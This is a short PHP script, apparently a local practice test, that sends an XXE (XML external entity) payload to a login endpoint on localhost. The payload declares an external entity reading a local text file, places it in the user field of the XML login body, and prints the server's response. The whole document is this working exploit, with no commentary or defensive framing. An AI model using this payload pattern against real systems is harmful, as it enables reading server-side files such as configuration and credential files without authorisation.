<?php
$xml=<<<XML
<?xml version="1.0" ?>
<!DOCTYPE own [ <!ELEMENT own ANY >
<!ENTITY own SYSTEM "C:/Users/josej/Desktop/prueba.txt">]>
<login>
  <user>&own;</user>
  <pass>Password</pass>
</login>
XML;

$ch=curl_init();
curl_setopt($ch,CURLOPT_HEADER,0);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch,CURLOPT_URL,"http://localhost/login.php");
curl_setopt($ch,CURLOPT_POST,1);  
curl_setopt($ch,CURLOPT_POSTFIELDS,$xml);
$data=curl_exec($ch);

if(curl_errno($ch)){
    print curl_error($ch);
}else{
    echo "Response: <br>",$data;
}
curl_close($ch);
?>